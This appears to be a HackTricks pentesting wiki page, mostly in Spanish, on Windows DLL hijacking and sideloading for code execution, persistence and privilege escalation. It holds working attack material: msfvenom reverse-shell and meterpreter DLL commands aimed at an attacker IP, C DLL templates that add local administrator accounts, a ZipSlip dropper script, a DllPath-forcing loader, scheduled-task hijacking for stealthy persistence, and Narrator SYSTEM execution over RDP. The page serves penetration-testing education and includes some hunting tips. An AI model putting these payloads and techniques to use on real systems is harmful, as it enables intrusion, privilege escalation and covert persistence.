# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking implica manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término abarca varias técnicas como **DLL Spoofing, Injection, and Side-Loading**. Se utiliza principalmente para ejecución de código, lograr persistence y, con menor frecuencia, privilege escalation. A pesar del enfoque en escalation aquí, el método de hijacking sigue siendo el mismo para todos los objetivos.

### Common Techniques

Se emplean varios métodos para DLL hijacking, cada uno con distinta eficacia según la estrategia de carga de DLL de la aplicación:

1. **DLL Replacement**: Sustituir una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para conservar la funcionalidad original de la DLL.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, aprovechando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que la cargue una aplicación, creyendo que es una DLL requerida que no existe.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación hacia la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método a menudo asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, similar a técnicas de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading no es la única forma de hacer que un proceso de confianza **.NET Framework** cargue código del atacante. Si el ejecutable objetivo es una aplicación **managed**, el CLR también consulta un **application configuration file** con el nombre del ejecutable (por ejemplo `Setup.exe.config`). Ese archivo puede definir un **AppDomainManager** personalizado. Si el config apunta a un assembly controlado por el atacante situado junto al EXE, el CLR lo carga **before the application's normal code path** y se ejecuta dentro del proceso de confianza.

Según el esquema de configuración de .NET Framework de Microsoft, tanto `<appDomainManagerAssembly>` como `<appDomainManagerType>` deben estar presentes para que se use el manager personalizado.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Manager mínimo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas prácticas:
- Esto es tradecraft específico de **.NET Framework**. Depende del análisis de configuración de CLR, no del orden de búsqueda de DLL de Win32.
- El host debe ser realmente un **managed EXE**. Triage rápido: `sigcheck -m target.exe`, `corflags target.exe`, o comprobar el **CLR Runtime Header** en los metadatos PE.
- El nombre del archivo de configuración debe coincidir exactamente con el nombre del ejecutable (`<binary>.config`) y normalmente vive **junto al EXE**.
- Esto es útil con **signed Microsoft/vendor binaries** porque el EXE confiable permanece intacto mientras la managed assembly maliciosa se ejecuta dentro del proceso.
- Si ya tienes un directorio de instalador/update con permisos de escritura, el AppDomainManager hijacking puede usarse como la **primera etapa**, seguido de classic DLL sideloading o reflective loading para las etapas posteriores.

### Hijacking an existing scheduled task to relaunch the sideload chain

Para persistencia, no solo busques **crear una nueva task**. Algunos intrusion sets esperan hasta que un instalador legítimo crea una **normal updater task** y luego **reescriben la task action** para que el nombre, autor y trigger existentes sigan pareciendo familiares a los defenders.

Workflow reutilizable:
1. Instala/ejecuta el software legítimo e identifica la task que normalmente crea.
2. Exporta el XML de la task y anota los valores actuales de `<Exec><Command>` / `<Arguments>`.
3. Reemplaza solo la acción para que la task inicie tu **trusted host EXE** desde un directorio de staging escribible por el usuario, el cual luego side-loads o AppDomain-loads el payload real.
4. Vuelve a registrar el mismo nombre de task en lugar de crear un nuevo artefacto de persistencia evidente.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Por qué es más sigiloso:
- El nombre de la tarea aún puede parecer legítimo (por ejemplo, un actualizador de proveedor).
- El **Task Scheduler service** la lanza, así que la validación de parent/ancestor a menudo ve la cadena de programación esperada en lugar de `explorer.exe`.
- Los equipos de DFIR que solo buscan **nuevos nombres de tarea** pueden pasar por alto una tarea cuya registro ya existía pero cuya acción ahora apunta a `%LOCALAPPDATA%`, `%APPDATA%` u otra ruta controlada por el atacante.

Pivotes rápidos de hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compara el XML de `C:\Windows\System32\Tasks\*` y los metadatos de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` contra una baseline.
- Alerta cuando una **vendor-looking updater task** se ejecuta desde **user-writable directories** o lanza un EXE de .NET con un archivo `*.config` colocalizado.

> [!TIP]
> Para una cadena paso a paso que combina HTML staging, configuraciones AES-CTR y implants de .NET sobre DLL sideloading, revisa el workflow de abajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

y mostrando solo la **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Si estás buscando **missing dlls en general**, deja esto ejecutándose durante algunos **segundos**.\
Si estás buscando una **missing dll dentro de un executable específico**, debes configurar **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo y detener la captura de eventos**.

## Exploiting Missing Dlls

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir un dll que un proceso privilegiado intentará cargar** en algún **lugar donde va a ser buscado**. Por lo tanto, podremos **escribir** un dll en una **carpeta** donde el **dll se busca antes** que la carpeta donde está el **dll original** (caso raro), o podremos **escribir en alguna carpeta donde se va a buscar el dll** y el **dll original** no existe en ninguna carpeta.

### Dll Search Order

**Dentro de la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan los Dlls específicamente.**

**Windows applications** buscan DLLs siguiendo un conjunto de **pre-defined search paths**, respetando una secuencia concreta. El problema del DLL hijacking surge cuando un DLL malicioso se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que el DLL auténtico. Una solución para prevenir esto es asegurar que la aplicación use rutas absolutas al referirse a los DLLs que necesita.

Puedes ver el **DLL search order on 32-bit** systems abajo:

1. El directorio desde el que se cargó la aplicación.
2. El system directory. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
3. El 16-bit system directory. No existe una función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
4. El Windows directory. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios que están listados en la variable de entorno PATH. Ten en cuenta que esto no incluye el path por aplicación especificado por la clave de registro **App Paths**. La clave **App Paths** no se usa al calcular el DLL search path.

Ese es el **default** search order con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual pasa al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (el valor por defecto es habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) se llama con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **un dll podría cargarse indicando la ruta absoluta en lugar de solo el nombre**. En ese caso, ese dll **solo se va a buscar en esa ruta** (si el dll tiene dependencias, se van a buscar igual que si se hubiera cargado por nombre).

Hay otras formas de alterar el search order, pero no las voy a explicar aquí.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Usa filtros de **ProcMon** (`Process Name` = target EXE, `Path` termina en `.dll`, `Result` = `NAME NOT FOUND`) para recopilar nombres de DLL que el proceso intenta buscar pero no encuentra.
2. Si el binary se ejecuta en una **schedule/service**, dejar caer un DLL con uno de esos nombres en el **application directory** (entrada #1 del search order) hará que se cargue en la siguiente ejecución. En un caso de scanner de .NET, el proceso buscaba `hostfxr.dll` en `C:\samples\app\` antes de cargar la copia real desde `C:\Program Files\dotnet\fxr\...`.
3. Construye un payload DLL (por ejemplo, reverse shell) con cualquier export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si tu primitive es un **ZipSlip-style arbitrary write**, crea un ZIP cuya entrada escape del extraction dir para que el DLL termine en la carpeta de la app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entrega el archive al inbox/share monitoreado; cuando la scheduled task vuelva a lanzar el process, cargará la malicious DLL y ejecutará tu code como la service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en el DLL search path de un nuevo process creado es establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS al crear el process con las ntdll native APIs. Al suministrar aquí un directory controlado por el attacker, se puede forzar a un target process que resuelve una imported DLL por name (sin absolute path y sin usar los safe loading flags) a cargar una malicious DLL desde ese directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operacional
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o haciendo proxy al real) en tu directorio DllPath.
- Lanza un binario firmado que se sepa que busca xmllite.dll por nombre usando la técnica anterior. El loader resuelve el import a través del DllPath proporcionado y hace sideload de tu DLL.

Esta técnica ha sido observada en-the-wild para impulsar cadenas de sideloading multi-stage: un launcher inicial deja caer una DLL helper, que luego crea un binario firmado por Microsoft y vulnerable a hijacking con un DllPath custom para forzar la carga de la DLL del atacante desde un staging directory.


#### Exceptions on dll search order from Windows docs

Ciertas excepciones al orden estándar de búsqueda de DLL se señalan en la documentación de Windows:

- Cuando se encuentra una **DLL que comparte su nombre con otra ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una comprobación de redirection y de manifest antes de recurrir a la DLL ya cargada en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- En los casos en que la DLL se reconoce como una **known DLL** para la versión actual de Windows, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **sin realizar el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si estuvieran indicadas solo por sus **module names**, independientemente de si la DLL inicial se identificó mediante una ruta completa.

### Escalating Privileges

**Requirements**:

- Identifica un proceso que opere u operará con **different privileges** (horizontal o lateral movement), que **carezca de una DLL**.
- Asegura que exista **write access** para cualquier **directory** en el que se vaya a **buscar** la **DLL**. Esta ubicación puede ser el directorio del ejecutable o un directorio dentro del system path.

Sí, los requisitos son complicados de encontrar, porque **por defecto es raro encontrar un ejecutable con privilegios al que le falte una dll** y es aún **más raro tener permisos de escritura en una carpeta del system path** (no los tienes por defecto). Pero, en entornos mal configurados, esto es posible.\
Si tienes suerte y te encuentras cumpliendo los requisitos, puedes revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque el **objetivo principal del proyecto es bypass UAC**, allí puedes encontrar un **PoC** de un Dll hijaking para la versión de Windows que puedes usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Nota que puedes **comprobar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **verifica los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes revisar los imports de un ejecutable y los exports de un dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtén un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### El tuyo

Ten en cuenta que, en varios casos, el Dll que compiles debe **exportar varias funciones** que van a ser cargadas por el proceso víctima; si estas funciones no existen, el **binary no podrá cargarlas** y el **exploit fallará**.

<details>
<summary>Plantilla de C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo con entrada de hilo</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudio de caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe todavía comprueba al inicio una DLL de localización predecible y específica del idioma que puede ser hijacked para arbitrary code execution y persistence.

Datos clave
- Ruta de comprobación (builds actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta heredada (builds antiguos): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL escribible controlada por el atacante en la ruta de OneCore, se carga y se ejecuta `DllMain(DLL_PROCESS_ATTACH)`. No se requieren exports.

Discovery con Procmon
- Filtro: `Process Name is Narrator.exe` y `Operation is Load Image` o `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta anterior.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silencio
- Un hijack ingenuo hablará/resaltará la UI. Para permanecer silencioso, al adjuntar enumera los hilos de Narrator, abre el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y haz `SuspendThread` sobre él; continúa en tu propio hilo. Ver PoC para el código completo.

Trigger y persistence mediante configuración de Accessibility
- Contexto de usuario (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al iniciar Narrator se carga la DLL plantada. En el secure desktop (pantalla de inicio de sesión), pulsa CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.

Ejecución SYSTEM activada por RDP (lateral movement)
- Permite la capa de seguridad RDP clásica: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate por RDP al host; en la pantalla de inicio de sesión pulsa CTRL+WIN+ENTER para lanzar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.
- La ejecución se detiene cuando la sesión RDP se cierra—inyecta/migra con rapidez.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada de registro de una Accessibility Tool (AT) integrada (por ejemplo, CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y luego establecer `configuration` con ese nombre de AT. Esto proxya ejecución arbitraria bajo el framework de Accessibility.

Notas
- Escribir en `%windir%\System32` y cambiar valores de HKLM requiere privilegios de administrador.
- Toda la lógica del payload puede vivir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Caso de estudio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), identificado como **CVE-2025-1729**.

### Detalles de la vulnerabilidad

- **Componente**: `TPQMAssistant.exe` ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM bajo el contexto del usuario que inició sesión.
- **Permisos de directorio**: Escribible por `CREATOR OWNER`, permitiendo a usuarios locales dejar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: Intenta cargar `hostfxr.dll` desde su directorio de trabajo primero y registra "NAME NOT FOUND" si falta, lo que indica prioridad de búsqueda en el directorio local.

### Implementación del exploit

Un atacante puede colocar un stub malicioso de `hostfxr.dll` en el mismo directorio, explotando la DLL faltante para lograr ejecución de código bajo el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM bajo el contexto del usuario actual.
3. Si hay un administrador iniciado sesión cuando se ejecuta la tarea, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de UAC bypass para elevar de integridad media a privilegios SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frecuentemente combinan droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso confiable y firmado.

Chain overview
- El usuario descarga el MSI. Un CustomAction se ejecuta en silencio durante la instalación GUI (por ejemplo, LaunchApplication o una acción VBScript), reconstruyendo la siguiente etapa desde recursos embebidos.
- El dropper escribe un EXE legítimo y firmado y una DLL maliciosa en el mismo directorio (ejemplo: wsc_proxy.exe firmado por Avast + wsc.dll controlado por el atacante).
- Cuando se inicia el EXE firmado, el orden de búsqueda de DLL de Windows carga primero wsc.dll desde el directorio de trabajo, ejecutando código del atacante bajo un proceso padre firmado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Busca entradas que ejecuten ejecutables o VBScript. Patrón sospechoso de ejemplo: LaunchApplication ejecutando un archivo embebido en segundo plano.
- En Orca (Microsoft Orca.exe), inspecciona las tablas CustomAction, InstallExecuteSequence y Binary.
- Payloads embebidos/divididos en el CAB del MSI:
- Extracción administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- O usa lessmsi: lessmsi x package.msi C:\out
- Busca múltiples fragmentos pequeños que se concatenan y descifran mediante un VBScript CustomAction. Flujo común:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Drop these two files in the same folder:
- wsc_proxy.exe: host firmado legítimo (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: DLL del atacante. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, construye una proxy DLL y reenvía los exports requeridos a la biblioteca genuina mientras ejecutas la payload en DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para los requisitos de exportación, usa un proxying framework (por ejemplo, DLLirant/Spartacus) para generar un forwarding DLL que también ejecute tu payload.

- Esta técnica depende de la resolución del nombre DLL por parte del binary host. Si el host usa absolute paths o safe loading flags (por ejemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS y forwarded exports pueden influir en la precedencia y deben tenerse en cuenta durante la selección del binary host y del export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point describió cómo Ink Dragon despliega ShadowPad usando un **three-file triad** para mezclarse con software legítimo mientras mantiene el core payload encrypted en disco:

1. **Signed host EXE** – se abusa de vendors como AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los attackers renombran el executable para que parezca un binary de Windows (por ejemplo `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **Malicious loader DLL** – se deja junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL suele ser un binary MFC ofuscado con el framework ScatterBrain; su única tarea es localizar el encrypted blob, decrypt it y mapear ShadowPad de forma reflective.
3. **Encrypted payload blob** – a menudo se almacena como `<name>.tmp` en el mismo directorio. Después de memory-mapping el decrypted payload, el loader elimina el archivo TMP para destruir la evidencia forense.

Tradecraft notes:

* Renombrar el signed EXE (manteniendo el `OriginalFileName` original en el encabezado PE) le permite hacerse pasar por un binary de Windows y conservar la vendor signature, así que replica el hábito de Ink Dragon de dejar binaries con apariencia de `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Como el executable sigue siendo trusted, la mayoría de los controles de allowlisting solo necesitan que tu malicious DLL esté al lado. Concéntrate en personalizar la loader DLL; normalmente el signed parent puede ejecutarse sin cambios.
